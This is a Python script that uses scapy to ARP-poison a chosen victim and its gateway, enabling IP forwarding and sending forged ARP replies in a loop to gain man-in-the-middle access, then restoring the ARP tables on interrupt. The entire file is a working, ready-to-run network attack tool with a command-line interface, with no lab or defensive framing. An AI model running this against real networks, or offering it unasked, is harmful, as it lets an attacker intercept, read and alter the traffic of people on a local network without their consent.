from scapy.all import *
import time
import os
import sys
import argparse
from sys import platform

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

# ---------------------------------------------------------------------------------------------------------------------------------- #

def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

# ---------------------------------------------------------------------------------------------------------------------------------- #

def _enable_ip_route():
    if platform == "linux" or platform == "linux2":
        _enable_linux_iproute()
    elif platform == "win32":
        _enable_windows_iproute()

# ---------------------------------------------------------------------------------------------------------------------------------- #

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

# ---------------------------------------------------------------------------------------------------------------------------------- #

def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent ARP packet dest-{} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=10)   # send restoring packet 10 times (CANT BE TOO SURE :)))))
    if verbose:
        print("[+] Sent ARP restore packet dest-{} : {} is-at {}".format(target_ip, host_ip, host_mac))

# ---------------------------------------------------------------------------------------------------------------------------------- #

def main(target, host):
    # enable ip forwarding
    _enable_ip_route()
    try:
        while True:
            spoof(target, host)
            spoof(host, target)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Keyboard Inturrupt! Restoring network....")
        restore(target, host)
        restore(host, target)

# ---------------------------------------------------------------------------------------------------------------------------------- #

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Arp Poison for MITM access')
    parser.add_argument('-t','--target_ip', help='IP addr of target to spoof', required=True)
    parser.add_argument('-r','--router_ip', help='IP addr of router (host) to spoof', required=True)
    args = vars(parser.parse_args())
    # victim ip address
    target = args['target_ip']
    # gateway ip address
    host = args['router_ip']
    main(target, host)